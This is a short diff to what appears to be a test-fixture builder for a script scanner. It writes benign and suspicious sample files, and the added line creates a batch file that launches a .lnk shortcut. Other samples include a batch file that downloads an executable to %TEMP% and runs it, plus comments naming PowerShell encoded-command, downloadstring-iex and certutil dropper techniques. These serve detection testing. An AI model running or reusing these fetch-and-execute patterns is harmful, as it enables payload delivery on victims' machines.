@@ -233,6 +233,7 @@ def build_folder(root):
     w("benign.ps1", b"Write-Host 'hello game'\n")
     w("docs.ps1", b"# docs: runs webclient downloadstring then iex (powershell -enc pattern)\n"
                    b"# see also: certutil -urlcache notes\nWrite-Host 'done'\n")
+    w("launch.bat", b"@echo off\r\nstart readme.lnk\r\n")
     w("docs.bat", b"@echo off\r\nREM powershell -enc AAAA hidden dropper notes\r\necho ok\r\n")
     w("dl.bat", ("@echo off\r\n%s %%TEMP%%\\a.exe\r\nstart %%TEMP%%\\a.exe\r\n" % _DL_CMD).encode())
     w("benign.bat", b"@echo off\r\necho Launching game\r\nstart game.exe\r\n")
